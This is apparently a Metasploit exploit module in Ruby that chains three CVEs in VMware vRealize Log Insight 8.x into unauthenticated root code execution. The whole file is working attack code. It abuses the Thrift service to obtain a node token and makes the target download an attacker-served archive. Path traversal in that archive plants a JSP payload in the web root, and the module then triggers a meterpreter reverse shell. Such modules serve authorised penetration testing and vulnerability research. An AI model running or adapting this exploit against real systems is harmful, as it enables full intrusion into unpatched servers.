##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/proto/thrift'
require 'rex/stopwatch'
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::CmdStager::HTTP
  include Msf::Exploit::Retry
  include Msf::Exploit::FileDropper # includes register_files_for_cleanup
  prepend Msf::Exploit::Remote::AutoCheck
 
  Thrift = Rex::Proto::Thrift
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vRealize Log Insight Unauthenticated RCE',
        'Description' => %q{
          VMware vRealize Log Insights versions v8.x contains multiple vulnerabilities, such as
          directory traversal, broken access control, deserialization, and information disclosure.
          When chained together, these vulnerabilities allow a remote, unauthenticated attacker to
          execute arbitrary commands on the underlying operating system as the root user.
 
          This module achieves code execution via triggering a `RemotePakDownloadCommand` command
          via the exposed thrift service after obtaining the node token by calling a `GetConfigRequest`
          thrift command. After the download, it will trigger a `PakUpgradeCommand` for processing the
          specially crafted PAK archive, which then will place the JSP payload under a certain API
          endpoint (pre-authenticated) location upon extraction for gaining remote code execution.
 
          Successfully tested against version 8.0.2.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Horizon3.ai Attack Team', # Original POC & analysis
          'Ege BALCI <egebalci[at]pm.me>', # Metasploit Module
        ],
        'References' => [
          ['ZDI', '23-116'],
          ['ZDI', '23-115'],
          ['CVE', '2022-31706'],
          ['CVE', '2022-31704'],
          ['CVE', '2022-31711'],
          ['URL', 'https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2023-0001.html'],
        ],
        'DisclosureDate' => '2023-01-24',
        'Platform' => %w[unix linux],
        'Arch' => [ARCH_X86, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'VMware vRealize Log Insight < v8.10.2',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64],
              'Type' => :linux_dropper,
              'DefaultOptions' => {
                'SSL' => true,
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
                'PrependFork' => true
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Payload' => {
          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
          'WfsDelay' => 15
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
 
    register_options(
      [
        Opt::RPORT(443),
        OptPort.new('THRIFT_PORT', [true, 'Thrift service port', 16520]),
        OptInt.new('THRIFT_TIMEOUT', [true, 'Timeout duration for thrift service', 10]),
        OptString.new('TARGETURI', [true, 'The URI of the VRLI web service', '/'])
      ]
    )
 
    register_advanced_options(
      [
        OptInt.new('WaitForResponseTimeout', [ true, 'The timeout in seconds for RemotePakDownload response', 10 ]),
        OptInt.new('WaitForUpgradeDuration', [ true, 'The sleep duration in seconds for PakUpgrade process', 2 ])
      ]
    )
  end
 
  def check
    print_status "Checking if #{peer} can be exploited."
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'i18n', 'component'),
      'method' => 'GET'
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200
    translation = JSON.parse(res.body.gsub(/^.+= /, '').gsub(/;/, ''))
    return Exploit::CheckCode::Unknown if translation.nil? || !translation.key?('version')
 
    version = Rex::Version.new(translation['version'])
    if version <= Rex::Version.new('8.10') && version >= Rex::Version.new('8.0') # This is not exactly the product version but we can use it
      return Exploit::CheckCode::Appears("VMware XRLI Version: #{translation['version']}")
    end
 
    Exploit::CheckCode::Safe
  end
 
  def generate_malicious_tar
    mf_file = <<~EOF.strip
      {
          "CHECKSUMS": [
              {
                  "CHECKSUM": "407791f5831c4f5321cda36ff2e3b63da2819354",#{' '}
                  "FILE_NAME": "eula.txt"
              },#{' '}
              {
                  "CHECKSUM": "8ab2c0a6d01a36d0daad230dbcb229f1b87154e6",#{' '}
                  "FILE_NAME": "cn_eula.txt"
              },#{' '}
              {
                  "CHECKSUM": "8ca69bdc2ddda5228e893c4843d9f4afc0790247",#{' '}
                  "FILE_NAME": "de_eula.txt"
              },#{' '}
              {
                  "CHECKSUM": "4278004a1f2a7a3f2d9310983679868ebe19e088",#{' '}
                  "FILE_NAME": "es_eula.txt"
              },#{' '}
              {
                  "CHECKSUM": "95280fd7033b59094703a29cc5d6ff803c5725af",#{' '}
                  "FILE_NAME": "fr_eula.txt"
              },#{' '}
              {
                  "CHECKSUM": "f8ee67f279b7f56c953daa737bbbaad3f0cb719d",#{' '}
                  "FILE_NAME": "ja_eula.txt"
              },#{' '}
              {
                  "CHECKSUM": "aaa14f774fc9fe487ae8fea59adfca532928f4a2",#{' '}
                  "FILE_NAME": "ko_eula.txt"
              },#{' '}
              {
                  "CHECKSUM": "d7003b652dd28d28af310c652e2a164acaf17580",#{' '}
                  "FILE_NAME": "tw_eula.txt"
              },#{' '}
              {
                  "CHECKSUM": "b0034c7f14876be3b6a85bde0322c83b78027d70",#{' '}
                  "FILE_NAME": "upgrade-driver"
              },#{' '}
              {
                  "CHECKSUM": "b906d570101d29646966435d2bed8479f4437216",#{' '}
                  "FILE_NAME": "upgrade-image-8.10.2-21145187.rpm"
              }
          ],#{' '}
          "FROM_VERSION": "8.8.0-0",#{' '}
          "REQUIRED_SPACE": "1073741824",#{' '}
          "RPM_INFO": {
              "KEY_LIST": [],#{' '}
              "REBOOT": "False",#{' '}
              "RPM_LIST": [
                  {
                      "ARGUMENTS": [
                          "--nodeps"
                      ],#{' '}
                      "FILE_NAME": "upgrade-image-8.10.2-21145187.rpm",#{' '}
                      "OPTION": "INSTALL_OR_UPGRADE"
                  }
              ]
          },#{' '}
          "TO_VERSION": "8.10.2-21145187"
      }
    EOF
 
    cert_file = <<~CERT
      SHA1(VMware-vRealize-Log-Insight.mf)= 9869831f4522f9aaaf2f71b54267c487a20c0d46f4dc884b56a2c77ea971aabd2839a39b22b0a864fa1825c7a637f25c85b99cfb9bf528990b7692cc5d526398fa6000809a94baaf9edcf20fab919f866014745bbf0a2cabadd76b8b6ec0ef862b803039021a4ebed2632bdecf2b77c60389e31f093ad010abeb33de1e95e59cb66a15c019b35453d71484e13f728fa74736bbe4cde37feddacef021feb0023b052ca00dd4563f4424e6387c33ffa166fb0331581a3889be4f2515512f1f15ea5d56aa43fe6a8d9b347b242edf2276eba7b055b8463f1151eab84d97d4d58bef4708080dbf0b96d4783ca8b596467a8965b91c2fddf1da549c0df34aa457f776
      -----BEGIN CERTIFICATE-----
      MIIDyzCCArOgAwIBAgIJAKH7xLtwMqSZMA0GCSqGSIb3DQEBBQUAME0xCzAJBgNV
      BAYTAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRIwEAYDVQQHEwlQYWxvIEFsdG8x
      FTATBgNVBAoTDFZNd2FyZSwgSW5jLjAeFw0xMDAyMjYyMjE3NDFaFw0yNjAxMDMy
      MjE3NDFaME0xCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRIwEAYD
      VQQHEwlQYWxvIEFsdG8xFTATBgNVBAoTDFZNd2FyZSwgSW5jLjCCASAwDQYJKoZI
      hvcNAQEBBQADggENADCCAQgCggEBALU9NUtC39fqG7yo2XAswUmtli9uA+31uAMw
      9FFHAEv/it8pzBQZ/4r+2bN+GnXOWhuDd1K4ApKMRvoO4LwQfZxrkx4pXrsu0gdb
      4OunHw0D8MrdzSoob8Js/uq+IJ+8Bhsc6b7RzTUt9HeDWzHasAJVgMsjehGt23ay
      9FKOT6dVD6D/Xi3qJnB/4t/XNS6L63dC3ea4guzKDyLaXIP5bf/m56jvVImFjhhT
      W2ASbnEUlZIVrEuyVcdG7e3FvZufE553JmHL0YG/0m5bIHXKRzBRx0D3HHOAzOKw
      kkOnxJHSTN4Hz8hSYCWvzUAjSYL3Q8qiTd7GHJ2ynsRnu3KlzKUCAQOjga8wgaww
      HQYDVR0OBBYEFHg8KQJdm8NPQDmYP41uEgKG+VNwMH0GA1UdIwR2MHSAFHg8KQJd
      m8NPQDmYP41uEgKG+VNwoVGkTzBNMQswCQYDVQQGEwJVUzETMBEGA1UECBMKQ2Fs
      aWZvcm5pYTESMBAGA1UEBxMJUGFsbyBBbHRvMRUwEwYDVQQKEwxWTXdhcmUsIElu
      Yy6CCQCh+8S7cDKkmTAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBBQUAA4IBAQCP
      nVEBVF2jYEsgaTJ1v17HNTVTD5pBPfbQk/2vYVZEWL20PtJuLeSWwoo5+TnCSp69
      i9n1Hpm9JWHjyb1Lba8Xx7VC4FferIyxt0ivRm9l9ouo/pQAR8xyqjTg1qfr5V8S
      fZElKbjpzSMPrxLwF77h+YB+YjqWAJpVV+fAkAvK7K9vMiFgW60teZBxVW/XlmG0
      IJaSUWSI3/A+bA6fuIy8PMmpQMtm0droHrCnViAVRhMMgEC/doMH1GqUSmoiyQ1G
      PifLAp5wV5/HV+S9AGrb8HGdWIvW+kBgmCl0wSf2JFYm1bpq30CVE4EC0MAY1mJG
      vSqQGIbCybw5KTCXRQ8d
      -----END CERTIFICATE-----
    CERT
 
    # Generate a TAR archive with dir traversal...
    print_status 'Encoding the payload as JSP'
    payload_jsp = Msf::Util::EXE.to_jsp(generate_payload_exe)
    jsp_name = 'api-v5-documentation.jsp' # version number can be randomized
    slip_name = "../../usr/lib/loginsight/application/3rd_party/apache-tomcat-8.5.82/webapps/ROOT/loginsight/api/#{jsp_name}"
    register_files_for_cleanup(slip_name.gsub('../..', ''))
    rand_data = Rex::Text.rand_text_alpha(35000..36000) # For realistic packet size
    dummy_files = ['upgrade-image-8.10.2-21145187.rpm', 'upgrade-driver', 'eula.txt'] # Dummy but also necessary
 
    tar = StringIO.new
    Rex::Tar::Writer.new(tar) do |t|
      dummy_files.each do |dum|
        t.add_file(dum, 0o644) do |f|
          f.write(rand_data)
        end
      end
      t.add_file('VMware-vRealize-Log-Insight.cert', 0o644) do |crt| # We actually need the content of these files
        crt.write(cert_file)
      end
      t.add_file('VMware-vRealize-Log-Insight.mf', 0o644) do |mf|
        mf.write(mf_file)
      end
      t.add_file(slip_name, 0o644) do |f|
        f.write(payload_jsp)
      end
    end
    tar.seek(0)
    data = tar.read
    tar.close
    data
  end
 
  def on_request_uri(cli, _request)
    payload_tar = generate_malicious_tar
    print_status "Malicious TAR payload created (#{payload_tar.length} bytes)"
    print_good("Payload requested by #{peer}, sending...")
    @got_request = true
    send_response(cli, payload_tar)
  end
 
  def exploit
    # This is important check...
    fail_with(Failure::BadConfig, 'SRVHOST can\'t be localhost') if datastore['SRVHOST'] =~ /(127|0)\.0\.0\.(0|1)|localhost/
 
    # Step 1 generate malicious TAR archive
    file_name = Rex::Text.rand_text_alpha(7)
    pak_name = "#{file_name}.pak"
    output_file = '/dev/null'
    register_files_for_cleanup("/tmp/#{pak_name}")
    print_status('Starting Payload Server')
    start_service('Path' => "/#{file_name}.tar")
 
    # Connect to the Apache Thrift service
    @tsock = Rex::Socket.create_tcp('PeerHost' => datastore['RHOST'], 'PeerPort' => datastore['THRIFT_PORT'])
    fail_with(Failure::Unreachable, "#{peer}:#{datastore['THRIFT_PORT']} - Could not connect to the thrift service") if @tsock.nil?
 
    # Step 2 obtain node token
    print_status 'Fetching thrift config...'
    send_request([
      Thrift::ThriftHeader.new(method_name: 'getConfig', message_type: Thrift::ThriftMessageType::CALL)
    ].map(&:to_binary_s).join + "\x0c\x00\x01\x00\x00")
 
    config = recv_response(datastore['THRIFT_TIMEOUT'])
    fail_with(Failure::UnexpectedReply, 'getConfig thrift call failed') if config.nil?
    token = config.match(/[0-9a-z]{8}-([0-9a-z]{4}-){3}[0-9a-z]{12}/).to_s
    fail_with(Failure::UnexpectedReply, 'Could not obtain node token') if token.nil? || token.empty?
    print_good "Obtained node token: #{token}"
 
    print_status 'Sending getNodeType...'
    send_request([
      Thrift::ThriftHeader.new(method_name: 'getNodeType', message_type: Thrift::ThriftMessageType::CALL)
    ].map(&:to_binary_s).join + "\x00")
 
    # Step 3 download the malicious pak
    serve_address = "http://#{Rex::Socket.to_authority(datastore['SRVHOST'], datastore['SRVPORT'])}/#{file_name}.tar"
    print_status 'Sending RemotePakDownloadCommand...'
    download_pak_req = "\x80\x01\x00\x01"
    download_pak_req += "\x00\x00\x00\x0a\x72\x75\x6e\x43"
    download_pak_req += "\x6f\x6d\x6d\x61\x6e\x64\x00\x00"
    download_pak_req += "\x00\x00\x0c\x00\x01\x0c\x00\x01"
    download_pak_req += "\x08\x00\x01\x00\x00\x00\x09\x0c"
    download_pak_req += "\x00\x0a\x0b\x00\x01"
    download_pak_req += [token.length].pack('N') + token + "\x0b\x00\x02"
    download_pak_req += [serve_address.length].pack('N') + serve_address # "\x00\x00\x00\x24" + serve_address
    download_pak_req += "\x0b\x00\x03" + [file_name.length].pack('N') + file_name
    download_pak_req += "\x00\x00\x0a\x00\x02\x00\x00"
    download_pak_req += "\x00\x00\x00\x00\x07\xd0\x00\x00"
    send_request(download_pak_req)
    download_resp = recv_response(datastore['THRIFT_TIMEOUT'])
    fail_with(Failure::UnexpectedReply, 'RemotePakDownloadCommand thrift call failed') if download_resp.nil?
    retry_until_truthy(timeout: datastore['ReconnectTimeout'].to_i) do
      @got_request
    end
 
    # Step 4 trigger pak upgrade
    print_status 'Sending PakUpgradeCommand...'
    pak_upgrade_req = "\x80\x01\x00\x01"
    pak_upgrade_req += "\x00\x00\x00\x0a\x72\x75\x6e\x43"
    pak_upgrade_req += "\x6f\x6d\x6d\x61\x6e\x64\x00\x00"
    pak_upgrade_req += "\x00\x00\x0c\x00\x01\x0c\x00\x01"
    pak_upgrade_req += "\x08\x00\x01\x00\x00\x00\x08\x0c"
    pak_upgrade_req += "\x00\x09\x0b\x00\x01" + [pak_name.length].pack('N')
    pak_upgrade_req += pak_name + "\x02\x00\x02\x00"
    pak_upgrade_req += "\x0b\x00\x03" + [output_file.length].pack('N') + + output_file
    pak_upgrade_req += "\x02\x00\x04\x00"
    pak_upgrade_req += "\x0b\x00\x05\x00\x00\x00\x03\x65"
    pak_upgrade_req += "\x6e\x67\x02\x00\x06\x00\x00\x00"
    pak_upgrade_req += "\x0a\x00\x02\x00\x00\x00\x00\x00"
    pak_upgrade_req += "\x00\x07\xd0\x00\x00"
    send_request(pak_upgrade_req)
    upgrade_resp = recv_response(datastore['THRIFT_TIMEOUT'])
    fail_with(Failure::UnexpectedReply, 'PakUpgradeCommand thrift call failed') if upgrade_resp.nil? || !upgrade_resp.to_s =~ 'The PAK file is corrupted'
    print_good 'PakUpgrade request is successful'
    print_status "Waiting #{datastore['WaitForUpgradeDuration']} second for PakUpgrade..."
    sleep(datastore['WaitForUpgradeDuration'])
 
    # Step 5 trigger the JSP payload.
    print_status "#{peer} - Triggering JSP payload..."
    disconnect
 
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'rest-api', 'v5'),
      'method' => 'GET'
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200
  end
 
  def send_request(request)
    @tsock.put([request.length].pack('N') + request)
  end
 
  def recv_response(timeout)
    remaining = timeout
    res_size, elapsed = Rex::Stopwatch.elapsed_time do
      @tsock.timed_read(4, remaining)
    end
 
    remaining -= elapsed
    return nil if res_size.nil? || res_size.length != 4 || remaining <= 0
 
    res = @tsock.timed_read(res_size.unpack1('N'), remaining)
 
    return nil if res.nil? || res.length != res_size.unpack1('N')
 
    return res_size + res
  rescue Timeout::Error
    return nil
  end
end
 